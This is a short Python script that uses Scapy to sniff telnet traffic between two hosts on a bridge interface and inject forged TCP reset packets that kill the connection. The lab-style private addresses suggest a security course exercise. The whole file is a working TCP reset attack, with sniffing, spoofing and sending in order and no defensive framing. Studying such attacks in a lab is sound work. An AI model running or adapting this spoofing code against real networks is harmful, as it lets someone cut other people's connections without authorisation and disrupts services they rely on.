#!/usr/bin/env python3
from scapy.all import *

def spoof(pkt): 
    # Extract IP and TCP layers from the original packet
    old_tcp = pkt[TCP]
    old_ip = pkt[IP]
    
    # Crafting the spoofed IP and TCP headers
    ip = IP(src=old_ip.dst, dst=old_ip.src)
    tcp = TCP(sport=old_tcp.dport, dport=old_tcp.sport, flags="R", seq=old_tcp.ack)
    
    # Construct the spoofed packet
    pkt_spoofed = ip/tcp
    
    # Log details about the original and spoofed packet
    print(f"Captured packet: {pkt.summary()}")
    print(f"Original source IP: {old_ip.src}, Destination IP: {old_ip.dst}")
    print(f"Original source port: {old_tcp.sport}, Destination port: {old_tcp.dport}")
    print(f"Spoofed packet: {pkt_spoofed.summary()}")
    
    # Optionally, list the layers of the spoofed packet
    ls(pkt_spoofed)
    
    # Send the spoofed packet
    print("Sending spoofed packet...")
    send(pkt_spoofed, verbose=0)

# Define the filter for sniffing TCP packets from specific source and destination
my_filter = "tcp and src host 10.9.0.7 and dst host 10.9.0.6 and src port 23"

# Start sniffing packets with the defined filter and call 'spoof' for each packet captured
print(f"Sniffing packets on interface 'br-82e939624594' with filter: {my_filter}")
sniff(iface="br-82e939624594", filter=my_filter, prn=spoof)
